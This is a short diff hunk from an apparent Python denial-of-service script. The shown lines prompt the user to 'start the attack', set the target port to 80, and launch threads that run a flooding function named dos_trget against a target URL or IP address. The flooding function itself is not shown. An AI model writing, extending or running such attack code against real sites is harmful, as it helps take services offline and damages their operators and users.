@@ -222,9 +222,9 @@ while True:
 #
     print("press enter to start the attack")
     nothing = input("")
+    port = 80
 #
     if not selection_input == ("ip"):
-        port = 0000
         for i in range(0, threads):
 #
             thr = threading.Thread(target=dos_trget, args=(target_url_ip,"ht",))
